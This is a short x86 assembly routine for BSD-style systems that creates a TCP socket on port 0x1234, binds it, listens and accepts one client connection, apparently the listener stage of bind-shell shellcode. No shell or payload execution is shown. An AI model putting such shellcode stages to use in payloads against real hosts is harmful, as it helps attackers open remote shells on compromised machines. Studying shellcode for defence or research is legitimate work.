_tcp_listen:
	xor	eax, eax	; zero out eax and edx
	cdq

	push	eax		; IPPROTO_IP
	inc	eax
	push	eax		; SOCK_STREAM
	inc	eax
	push	eax		; AF_INET
	push	edx		; spacer
	mov	al,  byte 97	; SYS_socket
	int     0x80
	jb	end
	mov	esi, eax	; Save server socket in esi

	;; Create sockaddr_in on the stack
	push	edx
	push	edx
	push	edx
	push	0x12340200	; sin_port, sin_family, sin_length
	mov	ebx, esp

	push	byte 16		; address_len
	push	ebx		; address
	push	esi		; socket
	push	edx		; spacer
	mov	al, 104		; SYS_bind
	int	0x80		; bind(s, saddr, 16)
	jb	end

	push	edx		; backlog
	push	esi		; socket
	push	edx		; spacer
	mov	al, 106		; SYS_listen
	int	0x80
	jb	end

	push	edx		; socklen_t* address_len = NULL
	push	edx		; struct sockaddr* address = NULL
	push	esi		; socket
	push	edx
	mov	al, 30		; SYS_accept
	int	0x80
	jb	end

	;; Leave connected socket in edi
	mov	edi, eax

	;; At this point:
	;; edi - client socket
	;; esi - server socket

